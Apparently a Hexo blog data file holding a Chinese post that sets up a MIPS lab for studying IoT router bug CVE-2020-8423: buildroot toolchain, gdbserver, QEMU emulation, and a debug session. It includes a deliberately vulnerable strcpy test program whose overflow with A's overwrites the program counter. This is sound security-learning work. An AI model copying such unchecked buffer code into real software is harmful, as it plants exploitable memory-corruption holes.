\"categories\"\n---\n","updated":"2022-01-22T23:06:39.757Z","path":"categories/index.html","comments":1,"layout":"page","_id":"ckyqg1c4d0000b8gk9ge5gupg","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"初探IOT安全CVE-2020-8423 PART1","date":"2021-09-05T12:04:02.000Z","_content":"# Environment\n## host\n- OS version: ubuntu 20.04\n- QEMU version: 4.2.1\n- gdbserver version: 7.11.1\n- buildroot branch: 2016.08.x\n## firmware\n![](1.png)\n- CPU: MIP32 big endian\n\n# Cross compile\n## 測試用程式\n撰寫了明顯有bof的測試程式。\n```c=\n#include<stdio.h>\n#include<string.h>\n\nint main(int argc,char *argv[]){\n    char buf[10];\n    strcpy(buf,argv[1]);\n    return 0;\n}\n```\n## buildroot\nbuildroot可以產出\n- cross-compilation toolchain\n- root filesystem\n- Linux kernel image\n- bootloader\n\n我們利用cross-compilation toolchain來編譯我們的source code以及gdbserver。\n\n使用舊版本的builtroot\n```bash=\ngit clone https://github.com/buildroot/buildroot.git\ncd buildroot\ngit checkout remotes/origin/2016.08.x\n```\n調整配置參數\n```bash=\nmake menuconfig\n```\ntarget version配置如下圖的。\n![](2.png)\n![](4.png)\n![](5.png)\n\n\n接下來開始編譯\n```bash=\nmake -j 16\n\n#如果遇到\n#freadahead.c:92:3: error: #error \"Please port gnulib freadahead.c to your platform! Look at the definition of fflush, fread, ungetc on your system, then report this to bug-gnulib.\"\ncd output/build/host-m4-1.4.17/\nsed -i 's/IO_ftrylockfile/IO_EOF_SEEN/' lib/*.c\necho \"#define _IO_IN_BACKUP 0x100\" >> lib/stdio-impl.h\n```\n## gdbserver編譯\n```bash=\n#與路徑有關的指令須調整\nwget https://ftp.gnu.org/gnu/gdb/gdb-7.11.1.tar.gz\n\ntar xzvf gdb-7.11.1.tar.gz\n\ncd gdb-7.11.1/gdb/gdbserver\n\nexport PATH=$PATH::/home/xiaobye/Documents/buildroot/output/host/usr/bin\n\n./configure --target=mips-linux \\\n            --host=mips-linux \\\n            --program-prefix=mips-linux \\\n            --disable-build-with-cxx \\\n            CFLAGS='-fPIC -static'\nsed -i -e 's/srv_linux_thread_db=yes//' configure.srv\n\nmake -j 16\n```\n## gdb-multiarch下載\n```bash=\nsudo apt-get install -y gdb-multiarch\n```\n## 編譯測試用程式\n```bash=\n#與路徑有關的指令須調整\nexport PATH=$PATH::/home/xiaobye/Documents/buildroot/output/host/usr/bin\nmips-linux-gcc -static -o vuln vuln.c\n```\n# QEMU\n## firmware emulation\n[kernel&disk載點](https://people.debian.org/~aurel32/qemu/mips/)\n啟動虛擬機\n```bash=\nsudo tunctl -t tap0\nsudo ifconfig tap0 192.168.50.2/24 up\n\nsudo qemu-system-mips -M malta \\\n    -m 512M \\\n    -kernel vmlinux-3.2.0-4-4kc-malta \\\n    -hda debian_wheezy_mips_standard.qcow2 \\\n    -append \"root=/dev/sda1 console=tty0\" \\\n    -netdev tap,id=tapnet,ifname=tap0,script=no \\\n    -device rtl8139,netdev=tapnet \\\n    -nographic\n```\n![](6.png)\n\n虛擬機內，將`/etc/network/interfaces`的內容，替換成下方配置。\n```bash=\n# This file describes the network interfaces available on your system\n# and how to activate them. For more information, see interfaces(5).\n\n# The loopback network interface\nauto lo\niface lo inet loopback\n\n# The primary network interface\nallow-hotplug eth0\niface eth0 inet static\n    address 192.168.50.1\n    netmask 255.255.255.0\n    gateway 192.168.50.2\n\n```\n設置虛擬機網卡IP\n```bash=\nifconfig eth0 192.168.50.1/24 up\n```\n## 上傳檔案\n以下指令在host端執行\n```bash=\n#使用scp將韌體root filesystem\nscp -r squashfs-root root@192.168.50.1:~\n#上傳編譯好的測試程式\nscp ./vuln  root@192.168.50.1:~\n#上傳gdbserver\nscp ./gdbserver  root@192.168.50.1:~\n```\n\n# GDB\n## Guest\n在虛擬機中執行以下指令\n```bash=\n./gdbserver 0.0.0.0:9000 ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAA\n```\n![](7.png)\n\n## Host\n在Host上執行以下指令啟動gdb-multiarch\n```bash=\n#要將檔案中的符號以及架構讀入\ngdb-multiarch  ./vuln\n```\ngdb中下指令連接到gdbserver，執行以下指令後可以發現確實造成Buffer overflow，覆蓋到PC。\n```gdb\ntarget remote 192.168.50.1:9000\nc\n```\n![](8.png)\n\n\n# Resource\n[学习记录：交叉编译环境配置（buildroot and gdb&gdbserver）](https://blog.csdn.net/zhy025907/article/details/52332528)\n[akpotter/embedded-toolkit](https://github.com/akpotter/embedded-toolkit/tree/master/src/gdb)\n[CVE-2020-8423 栈溢出复现](https://www.mrskye.cn/archives/e77640bd/)\n","source":"_posts/初探IOT安全CVE-2020-8423-PART1.md","raw":"---\ntitle: 初探IOT安全CVE-2020-8423 PART1\ndate: 2021-09-05 20:04:02\ntags: \n- IOT security\n- pwn\ncategories:\n- Real world\n---\n# Environment\n## host\n- OS version: ubuntu 20.04\n- QEMU version: 4.2.1\n- gdbserver version: 7.11.1\n- buildroot branch: 2016.08.x\n## firmware\n![](1.png)\n- CPU: MIP32 big endian\n\n# Cross compile\n## 測試用程式\n撰寫了明顯有bof的測試程式。\n```c=\n#include<stdio.h>\n#include<string.h>\n\nint main(int argc,char *argv[]){\n    char buf[10];\n    strcpy(buf,argv[1]);\n    return 0;\n}\n```\n## buildroot\nbuildroot可以產出\n- cross-compilation toolchain\n- root filesystem\n- Linux kernel image\n- bootloader\n\n我們利用cross-compilation toolchain來編譯我們的source code以及gdbserver。\n\n使用舊版本的builtroot\n```bash=\ngit clone https://github.com/buildroot/buildroot.git\ncd buildroot\ngit checkout remotes/origin/2016.08.x\n```\n調整配置參數\n```bash=\nmake menuconfig\n```\ntarget version配置如下圖的。\n![](2.png)\n![](4.png)\n![](5.png)\n\n\n接下來開始編譯\n```bash=\nmake -j 16\n\n#如果遇到\n#freadahead.c:92:3: error: #error \"Please port gnulib freadahead.c to your platform! Look at the definition of fflush, fread, ungetc on your system, then report this to bug-gnulib.\"\ncd output/build/host-m4-1.4.17/\nsed -i 's/IO_ftrylockfile/IO_EOF_SEEN/' lib/*.c\necho \"#define _IO_IN_BACKUP 0x100\" >> lib/stdio-impl.h\n```\n## gdbserver編譯\n```bash=\n#與路徑有關的指令須調整\nwget https://ftp.gnu.org/gnu/gdb/gdb-7.11.1.tar.gz\n\ntar xzvf gdb-7.11.1.tar.gz\n\ncd gdb-7.11.1/gdb/gdbserver\n\nexport PATH=$PATH::/home/xiaobye/Documents/buildroot/output/host/usr/bin\n\n./configure --target=mips-linux \\\n            --host=mips-linux \\\n            --program-prefix=mips-linux \\\n            --disable-build-with-cxx \\\n            CFLAGS='-fPIC -static'\nsed -i -e 's/srv_linux_thread_db=yes//' configure.srv\n\nmake -j 16\n```\n## gdb-multiarch下載\n```bash=\nsudo apt-get install -y gdb-multiarch\n```\n## 編譯測試用程式\n```bash=\n#與路徑有關的指令須調整\nexport PATH=$PATH::/home/xiaobye/Documents/buildroot/output/host/usr/bin\nmips-linux-gcc -static -o vuln vuln.c\n```\n# QEMU\n## firmware emulation\n[kernel&disk載點](https://people.debian.org/~aurel32/qemu/mips/)\n啟動虛擬機\n```bash=\nsudo tunctl -t tap0\nsudo ifconfig tap0 192.168.50.2/24 up\n\nsudo qemu-system-mips -M malta \\\n    -m 512M \\\n    -kernel vmlinux-3.2.0-4-4kc-malta \\\n    -hda debian_wheezy_mips_standard.qcow2 \\\n    -append \"root=/dev/sda1 console=tty0\" \\\n    -netdev tap,id=tapnet,ifname=tap0,script=no \\\n    -device rtl8139,netdev=tapnet \\\n    -nographic\n```\n![](6.png)\n\n虛擬機內，將`/etc/network/interfaces`的內容，替換成下方配置。\n```bash=\n# This file describes the network interfaces available on your system\n# and how to activate them. For more information, see interfaces(5).\n\n# The loopback network interface\nauto lo\niface lo inet loopback\n\n# The primary network interface\nallow-hotplug eth0\niface eth0 inet static\n    address 192.168.50.1\n    netmask 255.255.255.0\n    gateway 192.168.50.2\n\n```\n設置虛擬機網卡IP\n```bash=\nifconfig eth0 192.168.50.1/24 up\n```\n## 上傳檔案\n以下指令在host端執行\n```bash=\n#使用scp將韌體root filesystem\nscp -r squashfs-root root@192.168.50.1:~\n#上傳編譯好的測試程式\nscp ./vuln  root@192.168.50.1:~\n#上傳gdbserver\nscp ./gdbserver  root@192.168.50.1:~\n```\n\n# GDB\n## Guest\n在虛擬機中執行以下指令\n```bash=\n./gdbserver 0.0.0.0:9000 ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAA\n```\n![](7.png)\n\n## Host\n在Host上執行以下指令啟動gdb-multiarch\n```bash=\n#要將檔案中的符號以及架構讀入\ngdb-multiarch  ./vuln\n```\ngdb中下指令連接到gdbserver，執行以下指令後可以發現確實造成Buffer overflow，覆蓋到PC。\n```gdb\ntarget remote 192.168.50.1:9000\nc\n```\n![](8.png)\n\n\n# Resource\n[学习记录：交叉编译环境配置（buildroot and gdb&gdbserver）](https://blog.csdn.net/zhy025907/article/details/52332528)\n[akpotter/embedded-toolkit](https://github.com/akpotter/embedded-toolkit/tree/master/src/gdb)\n[CVE-2020-8423 栈溢出复现](https://www.mrskye.cn/archives/e77640bd/)\n","slug":"初探IOT安全CVE-2020-8423-PART1","published":1,"updated":"2022-01-22T23:08:39.140Z","_id":"ckyopyh2100019kgk1rfo2613","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Environment\"><a href=\"#Environment\" class=\"headerlink\" title=\"Environment\"></a>Environment</h1><h2 id=\"host\"><a href=\"#host\" class=\"headerlink\" title=\"host\"></a>host</h2><ul>\n<li>OS version: ubuntu 20.04</li>\n<li>QEMU version: 4.2.1</li>\n<li>gdbserver version: 7.11.1</li>\n<li>buildroot branch: 2016.08.x<h2 id=\"firmware\"><a href=\"#firmware\" class=\"headerlink\" title=\"firmware\"></a>firmware</h2><img src=\"/2021/09/05/%E5%88%9D%E6%8E%A2IOT%E5%AE%89%E5%85%A8CVE-2020-8423-PART1/1.png\"></li>\n<li>CPU: MIP32 big endian</li>\n</ul>\n<h1 id=\"Cross-compile\"><a href=\"#Cross-compile\" class=\"headerlink\" title=\"Cross compile\"></a>Cross compile</h1><h2 id=\"測試用程式\"><a href=\"#測試用程式\" class=\"headerlink\" title=\"測試用程式\"></a>測試用程式</h2><p>撰寫了明顯有bof的測試程式。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc,<span class=\"keyword\">char</span> *argv[])</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buf[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buf,argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"buildroot\"><a href=\"#buildroot\" class=\"headerlink\" title=\"buildroot\"></a>buildroot</h2><p>buildroot可以產出</p>\n<ul>\n<li>cross-compilation toolchain</li>\n<li>root filesystem</li>\n<li>Linux kernel image</li>\n<li>bootloader</li>\n</ul>\n<p>我們利用cross-compilation toolchain來編譯我們的source code以及gdbserver。</p>\n<p>使用舊版本的builtroot</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/buildroot/buildroot.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> buildroot</span><br><span class=\"line\">git checkout remotes/origin/2016.08.x</span><br></pre></td></tr></table></figure>\n<p>調整配置參數</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">make menuconfig</span><br></pre></td></tr></table></figure>\n<p>target version配置如下圖的。<br><img src=\"/2021/09/05/%E5%88%9D%E6%8E%A2IOT%E5%AE%89%E5%85%A8CVE-2020-8423-PART1/2.png\"><br><img src=\"/2021/09/05/%E5%88%9D%E6%8E%A2IOT%E5%AE%89%E5%85%A8CVE-2020-8423-PART1/4.png\"><br><img src=\"/2021/09/05/%E5%88%9D%E6%8E%A2IOT%E5%AE%89%E5%85%A8CVE-2020-8423-PART1/5.png\"></p>\n<p>接下來開始編譯</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">make -j 16</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#如果遇到</span></span><br><span class=\"line\"><span class=\"comment\">#freadahead.c:92:3: error: #error &quot;Please port gnulib freadahead.c to your platform! Look at the definition of fflush, fread, ungetc on your system, then report this to bug-gnulib.&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> output/build/host-m4-1.4.17/</span><br><span class=\"line\">sed -i <span class=\"string\">&#x27;s/IO_ftrylockfile/IO_EOF_SEEN/&#x27;</span> lib/*.c</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;#define _IO_IN_BACKUP 0x100&quot;</span> &gt;&gt; lib/stdio-impl.h</span><br></pre></td></tr></table></figure>\n<h2 id=\"gdbserver編譯\"><a href=\"#gdbserver編譯\" class=\"headerlink\" title=\"gdbserver編譯\"></a>gdbserver編譯</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#與路徑有關的指令須調整</span></span><br><span class=\"line\">wget https://ftp.gnu.org/gnu/gdb/gdb-7.11.1.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\">tar xzvf gdb-7.11.1.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cd</span> gdb-7.11.1/gdb/gdbserver</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">export</span> PATH=<span class=\"variable\">$PATH</span>::/home/xiaobye/Documents/buildroot/output/host/usr/bin</span><br><span class=\"line\"></span><br><span class=\"line\">./configure --target=mips-linux \\</span><br><span class=\"line\">            --host=mips-linux \\</span><br><span class=\"line\">            --program-prefix=mips-linux \\</span><br><span class=\"line\">            --disable-build-with-cxx \\</span><br><span class=\"line\">            CFLAGS=<span class=\"string\">&#x27;-fPIC -static&#x27;</span></span><br><span class=\"line\">sed -i -e <span class=\"string\">&#x27;s/srv_linux_thread_db=yes//&#x27;</span> configure.srv</span><br><span class=\"line\"></span><br><span class=\"line\">make -j 16</span><br></pre></td></tr></table></figure>\n<h2 id=\"gdb-multiarch下載\"><a href=\"#gdb-multiarch下載\" class=\"headerlink\" title=\"gdb-multiarch下載\"></a>gdb-multiarch下載</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install -y gdb-multiarch</span><br></pre></td></tr></table></figure>\n<h2 id=\"編譯測試用程式\"><a href=\"#編譯測試用程式\" class=\"headerlink\" title=\"編譯測試用程式\"></a>編譯測試用程式</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#與路徑有關的指令須調整</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> PATH=<span class=\"variable\">$PATH</span>::/home/xiaobye/Documents/buildroot/output/host/usr/bin</span><br><span class=\"line\">mips-linux-gcc -static -o vuln vuln.c</span><br></pre></td></tr></table></figure>\n<h1 id=\"QEMU\"><a href=\"#QEMU\" class=\"headerlink\" title=\"QEMU\"></a>QEMU</h1><h2 id=\"firmware-emulation\"><a href=\"#firmware-emulation\" class=\"headerlink\" title=\"firmware emulation\"></a>firmware emulation</h2><p><a href=\"https://people.debian.org/~aurel32/qemu/mips/\">kernel&amp;disk載點</a><br>啟動虛擬機</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo tunctl -t tap0</span><br><span class=\"line\">sudo ifconfig tap0 192.168.50.2/24 up</span><br><span class=\"line\"></span><br><span class=\"line\">sudo qemu-system-mips -M malta \\</span><br><span class=\"line\">    -m 512M \\</span><br><span class=\"line\">    -kernel vmlinux-3.2.0-4-4kc-malta \\</span><br><span class=\"line\">    -hda debian_wheezy_mips_standard.qcow2 \\</span><br><span class=\"line\">    -append <span class=\"string\">&quot;root=/dev/sda1 console=tty0&quot;</span> \\</span><br><span class=\"line\">    -netdev tap,id=tapnet,ifname=tap0,script=no \\</span><br><span class=\"line\">    -device rtl8139,netdev=tapnet \\</span><br><span class=\"line\">    -nographic</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/09/05/%E5%88%9D%E6%8E%A2IOT%E5%AE%89%E5%85%A8CVE-2020-8423-PART1/6.png\"></p>\n<p>虛擬機內，將<code>/etc/network/interfaces</code>的內容，替換成下方配置。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># This file describes the network interfaces available on your system</span></span><br><span class=\"line\"><span class=\"comment\"># and how to activate them. For more information, see interfaces(5).</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The loopback network interface</span></span><br><span class=\"line\">auto lo</span><br><span class=\"line\">iface lo inet loopback</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The primary network interface</span></span><br><span class=\"line\">allow-hotplug eth0</span><br><span class=\"line\">iface eth0 inet static</span><br><span class=\"line\">    address 192.168.50.1</span><br><span class=\"line\">    netmask 255.255.255.0</span><br><span class=\"line\">    gateway 192.168.50.2</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>設置虛擬機網卡IP</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ifconfig eth0 192.168.50.1/24 up</span><br></pre></td></tr></table></figure>\n<h2 id=\"上傳檔案\"><a href=\"#上傳檔案\" class=\"headerlink\" title=\"上傳檔案\"></a>上傳檔案</h2><p>以下指令在host端執行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#使用scp將韌體root filesystem</span></span><br><span class=\"line\">scp -r squashfs-root root@192.168.50.1:~</span><br><span class=\"line\"><span class=\"comment\">#上傳編譯好的測試程式</span></span><br><span class=\"line\">scp ./vuln  root@192.168.50.1:~</span><br><span class=\"line\"><span class=\"comment\">#上傳gdbserver</span></span><br><span class=\"line\">scp ./gdbserver  root@192.168.50.1:~</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"GDB\"><a href=\"#GDB\" class=\"headerlink\" title=\"GDB\"></a>GDB</h1><h2 id=\"Guest\"><a href=\"#Guest\" class=\"headerlink\" title=\"Guest\"></a>Guest</h2><p>在虛擬機中執行以下指令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./gdbserver 0.0.0.0:9000 ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/09/05/%E5%88%9D%E6%8E%A2IOT%E5%AE%89%E5%85%A8CVE-2020-8423-PART1/7.png\"></p>\n<h2 id=\"Host\"><a href=\"#Host\" class=\"headerlink\" title=\"Host\"></a>Host</h2><p>在Host上執行以下指令啟動gdb-multiarch</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#要將檔案中的符號以及架構讀入</span></span><br><span class=\"line\">gdb-multiarch  ./vuln</span><br></pre></td></tr></table></figure>\n<p>gdb中下指令連接到gdbserver，執行以下指令後可以發現確實造成Buffer overflow，覆蓋到PC。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target remote 192.168.50.1:9000</span><br><span class=\"line\">c</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/09/05/%E5%88%9D%E6%8E%A2IOT%E5%AE%89%E5%85%A8CVE-2020-8423-PART1/8.png\"></p>\n<h1 id=\"Resource\"><a href=\"#Resource\" class=\"headerlink\" title=\"Resource\"></a>Resource</h1><p><a href=\"https://blog.csdn.net/zhy025907/article/details/52332528\">学习记录：交叉编译环境配置（buildroot and gdb&amp;gdbserver）</a><br><a href=\"https://github.com/akpotter/embedded-toolkit/tree/master/src/gdb\">akpotter/embedded-toolkit</a><br><a href=\"https://www.mrskye.cn/archives/e77640bd/\">CVE-2020-8423 栈溢出复现</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Environment\"><a href=\"#Environment\" class=\"headerlink\" title=\"Environment\"></a>Environment</h1><h2 id=\"host\"><a href=\"#host\" class=\"headerlink\" title=\"host\"></a>host</h2><ul>\n<li>OS version: ubuntu 20.04</li>\n<li>QEMU version: 4.2.1</li>\n<li>gdbserver version: 7.11.1</li>\n<li>buildroot branch: 2016.08.x<h2 id=\"firmware\"><a href=\"#firmware\" class=\"headerlink\" title=\"firmware\"></a>firmware</h2><img src=\"/2021/09/05/%E5%88%9D%E6%8E%A2IOT%E5%AE%89%E5%85%A8CVE-2020-8423-PART1/1.png\"></li>\n<li>CPU: MIP32 big endian</li>\n</ul>\n<h1 id=\"Cross-compile\"><a href=\"#Cross-compile\" class=\"headerlink\" title=\"Cross compile\"></a>Cross compile</h1><h2 id=\"測試用程式\"><a href=\"#測試用程式\" class=\"headerlink\" title=\"測試用程式\"></a>測試用程式</h2><p>撰寫了明顯有bof的測試程式。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc,<span class=\"keyword\">char</span> *argv[])</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buf[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buf,argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"buildroot\"><a href=\"#buildroot\" class=\"headerlink\" title=\"buildroot\"></a>buildroot</h2><p>buildroot可以產出</p>\n<ul>\n<li>cross-compilation toolchain</li>\n<li>root filesystem</li>\n<li>Linux kernel image</li>\n<li>bootloader</li>\n</ul>\n<p>我們利用cross-compilation toolchain來編譯我們的source code以及gdbserver。</p>\n<p>使用舊版本的builtroot</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/buildroot/buildroot.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> buildroot</span><br><span class=\"line\">git checkout remotes/origin/2016.08.x</span><br></pre></td></tr></table></figure>\n<p>調整配置參數</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">make menuconfig</span><br></pre></td></tr></table></figure>\n<p>target version配置如下圖的。<br><img src=\"/2021/09/05/%E5%88%9D%E6%8E%A2IOT%E5%AE%89%E5%85%A8CVE-2020-8423-PART1/2.png\"><br><img src=\"/2021/09/05/%E5%88%9D%E6%8E%A2IOT%E5%AE%89%E5%85%A8CVE-2020-8423-PART1/4.png\"><br><img src=\"/2021/09/05/%E5%88%9D%E6%8E%A2IOT%E5%AE%89%E5%85%A8CVE-2020-8423-PART1/5.png\"></p>\n<p>接下來開始編譯</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">make -j 16</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#如果遇到</span></span><br><span class=\"line\"><span class=\"comment\">#freadahead.c:92:3: error: #error &quot;Please port gnulib freadahead.c to your platform! Look at the definition of fflush, fread, ungetc on your system, then report this to bug-gnulib.&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> output/build/host-m4-1.4.17/</span><br><span class=\"line\">sed -i <span class=\"string\">&#x27;s/IO_ftrylockfile/IO_EOF_SEEN/&#x27;</span> lib/*.c</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;#define _IO_IN_BACKUP 0x100&quot;</span> &gt;&gt; lib/stdio-impl.h</span><br></pre></td></tr></table></figure>\n<h2 id=\"gdbserver編譯\"><a href=\"#gdbserver編譯\" class=\"headerlink\" title=\"gdbserver編譯\"></a>gdbserver編譯</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#與路徑有關的指令須調整</span></span><br><span class=\"line\">wget https://ftp.gnu.org/gnu/gdb/gdb-7.11.1.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\">tar xzvf gdb-7.11.1.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cd</span> gdb-7.11.1/gdb/gdbserver</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">export</span> PATH=<span class=\"variable\">$PATH</span>::/home/xiaobye/Documents/buildroot/output/host/usr/bin</span><br><span class=\"line\"></span><br><span class=\"line\">./configure --target=mips-linux \\</span><br><span class=\"line\">            --host=mips-linux \\</span><br><span class=\"line\">            --program-prefix=mips-linux \\</span><br><span class=\"line\">            --disable-build-with-cxx \\</span><br><span class=\"line\">            CFLAGS=<span class=\"string\">&#x27;-fPIC -static&#x27;</span></span><br><span class=\"line\">sed -i -e <span class=\"string\">&#x27;s/srv_linux_thread_db=yes//&#x27;</span> configure.srv</span><br><span class=\"line\"></span><br><span class=\"line\">make 